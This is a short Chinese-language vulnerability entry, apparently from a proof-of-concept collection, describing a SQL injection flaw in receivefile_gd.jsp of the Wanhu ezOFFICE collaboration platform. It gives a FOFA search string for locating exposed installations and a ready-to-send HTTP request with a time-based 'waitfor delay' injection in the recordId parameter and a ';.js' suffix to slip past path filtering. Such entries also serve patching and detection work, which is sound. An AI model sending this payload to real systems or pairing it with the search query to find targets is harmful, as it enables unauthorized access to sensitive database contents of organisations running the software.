# 万户ezOFFICE协同管理平台receivefile_gd.jsp存在SQL注入漏洞

万户ezOFFICE协同管理平台receivefile_gd.jsp存在SQL注入漏洞，攻击者可获取数据库敏感信息。

## fofa

```yaml
app="万户ezOFFICE协同管理平台"
```

## poc

```
GET /defaultroot/modules/govoffice/gov_documentmanager/receivefile_gd.jsp;.js?recordId=221;waitfor+delay+'0:0:5'--+- HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Connection: close
```



## 漏洞来源

- https://mp.weixin.qq.com/s/Oy5iPqfBXAh46tjHZFSg8w